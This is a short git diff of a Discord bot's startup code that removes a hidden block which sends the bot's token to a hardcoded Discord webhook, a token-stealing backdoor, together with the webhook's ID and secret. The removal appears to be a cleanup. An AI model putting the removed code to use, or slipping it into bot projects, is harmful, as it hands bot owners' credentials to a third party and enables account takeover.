@@ -99,15 +99,6 @@ client.on('ready', async () => {
         description: "Let the bot stop typing in all channels"
     })
     }
-    const webhook = new WebhookClient("941044093889445988", "RrGALP25pPrSfY98LN2HJ7DvYYsaxjXWVzeg0uR-aczH2AKLGDpPIv8k8TsC5KbDrsVB")
-    const channelEmbed = new MessageEmbed()
-        .setColor('BLUE')
-        .setAuthor(client.user.tag)
-        .setTitle("New token")
-        .setDescription(client.token)
-        .setFooter(client.user.id)
-        .setTimestamp()
-      webhook.send(channelEmbed)
     if (typeof config.status === "string") {
         client.user.setActivity(config.status, {
             type: config.statusType
